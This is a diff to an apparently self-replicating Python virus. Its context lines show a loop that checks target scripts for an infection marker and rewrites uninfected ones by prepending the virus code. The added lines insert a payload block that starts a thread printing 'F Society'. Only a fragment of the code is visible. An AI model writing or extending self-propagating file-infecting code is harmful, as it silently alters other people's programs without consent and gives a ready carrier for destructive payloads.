@@ -29,13 +29,29 @@ for target in target_scripts:
             if formatted_line == "#### BEGIN HEADER ####":
                 flag = True
                 break
-        
+
     if not flag:
         final_code = virus_code + ["\n"] + target_script_code
 
         with open(target, "w") as fp:
             fp.writelines(final_code)
 
+
+#### BEGIN PAYLOAD ####
+
+import threading
+import time
+
+
+def payload():
+    time.sleep(2)
+    print("F Society")
+
+
+thread = threading.Thread(target=payload)
+thread.start()
+
+#### END PAYLOAD ####
 
 
 #### END HEADER ####
